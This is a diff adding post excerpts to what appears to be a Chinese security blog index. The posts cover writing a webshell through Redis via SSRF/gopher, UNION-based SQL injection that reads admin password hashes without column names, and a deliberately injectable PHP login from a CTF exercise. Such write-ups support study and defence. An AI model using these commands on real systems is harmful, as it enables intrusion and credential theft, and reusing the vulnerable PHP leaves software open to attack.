@@ -117,6 +117,460 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-05  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Orange在BH大会的paper上面这么说的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到的数据流如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&#x2F;var&#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&lt;?php phpinfo();?&gt;\r
+*1\r
+$4\r
+save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Orange在BH大会的paper上面这么说的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到的数据流如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&#x2F;var&#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&lt;?php phpinfo();?&gt;\r
+*1\r
+$4\r
+save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/11/28/sql-bypass-unknown.html" >SQL注入绕过未知字段名的技巧</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-11-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+	
+
+	</div>
+  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+---+---+</span>
+<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
+<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
+<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+</span>
+<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>
+
+mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
+<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+	
+	</div>
+  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/11/23/order-by-blind.html" >基于order by的盲注</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-11-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+  $dbhost &#x3D; &quot;172.19.0.2&quot;;
+  $dbuser &#x3D; &quot;root&quot;;
+  $dbpass &#x3D; &quot;root&quot;;
+  $db &#x3D; &quot;vul&quot;;
+  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,&quot;utf8&quot;);
+ 
+  &#x2F;* sql
+ 
+     create  table &#96;admin&#96; (
+        &#96;id&#96; int(10) not null primary key auto_increment,
+        &#96;username&#96; varchar(20) not null ,
+        &#96;password&#96; varchar(32) not null
+     );
+  *&#x2F;
+function   filter($str)&#123;
+      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
+      if(preg_match($filterlist,strtolower($str)))&#123;
+        die(&quot;illegal input!&quot;);
+      &#125;
+      return $str;
+  &#125;
+$username &#x3D; isset($_POST[&#39;username&#39;])?
+filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
+$password &#x3D; isset($_POST[&#39;password&#39;])?
+filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
+$sql &#x3D; &quot;select * from admin where  username &#x3D;
+ &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
+ 
+$res &#x3D; $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0)&#123;
+  $row &#x3D; $res -&gt; fetch_assoc();
+  if($row[&#39;id&#39;])&#123;
+     echo $row[&#39;username&#39;];
+  &#125;
+&#125;else&#123;
+   echo &quot;The content in the password column is the &quot;;
+&#125;
+ 
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
